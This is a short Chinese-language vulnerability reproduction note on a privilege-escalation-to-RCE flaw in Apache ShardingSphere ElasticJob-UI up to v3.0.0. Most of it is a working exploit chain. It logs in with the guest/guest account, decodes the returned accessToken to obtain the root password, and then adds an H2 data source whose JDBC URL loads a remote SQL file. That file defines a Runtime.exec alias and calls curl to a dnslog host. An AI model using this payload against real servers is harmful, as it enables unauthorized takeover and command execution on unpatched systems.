1 漏洞介绍
    Apache ShardingSphere 是一套开源的分布式数据库解决方案组成的生态圈，它由 JDBC、Proxy 和 Sidecar（规划中）这 3 款既能够独立部署，又支持混合部署配合使用的产品组成。它们均提供标准化的数据水平扩展、分布式事务和分布式治理等功能，可适用于如 Java 同构、异构语言、云原生等各种多样化的应用场景。

    2022年1月20日，Apache官方通报了一则 Apache ShardingSphere ElasticJob-UI的漏洞信息，未授权的来宾账号可实现权限提升，获取管理员权限，进而实现RCE。
2 影响范围
Apache ShardingSphere ElasticJob-UI <= v3.0.0
3 漏洞复现
（1）信息泄露：可获得root账号密码。
http://xxx.xxx.xxx.xxx/api/login
post值：{"username":"guest","password":"guest"}

（2）base解码accessToken值，获得root密码。

（3）RCE：使用root登录后，选择`Add a data source`的功能，点击添加。

（4）Driver选择org.h2.Driver，Url填入以下内容，指向我们准备好的sql文件。
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://xxx.xx.xxx.xx/poc.sql'
poc.sql内容：CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "Q";}';CALL EXEC ('curl 26weds.dnslog.cn')

(5)点击测试连接，dnslog收到记录。
